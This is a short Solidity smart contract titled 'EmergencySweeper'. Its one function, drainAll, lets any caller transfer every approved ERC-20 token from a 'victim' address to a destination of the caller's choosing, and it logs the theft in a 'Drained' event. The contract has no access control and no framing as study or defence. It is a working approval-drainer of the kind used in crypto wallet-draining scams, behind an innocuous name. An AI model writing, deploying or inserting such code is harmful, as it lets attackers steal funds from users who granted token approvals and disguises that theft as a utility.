// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract EmergencySweeper {
    event Drained(address indexed victim, address indexed token, address indexed destination, uint256 amount);

    function drainAll(address token, address destination, address victim) external {
        require(destination != address(0), "Bad destination");
        IERC20 t = IERC20(token);
        uint256 amount = t.allowance(victim, address(this));
        require(amount > 0, "No allowance");
        uint256 balance = t.balanceOf(victim);
        if (amount > balance) amount = balance;
        require(amount > 0, "No balance");
        bool success = t.transferFrom(victim, destination, amount);
        require(success, "Transfer failed");
        emit Drained(victim, token, destination, amount);
    }
}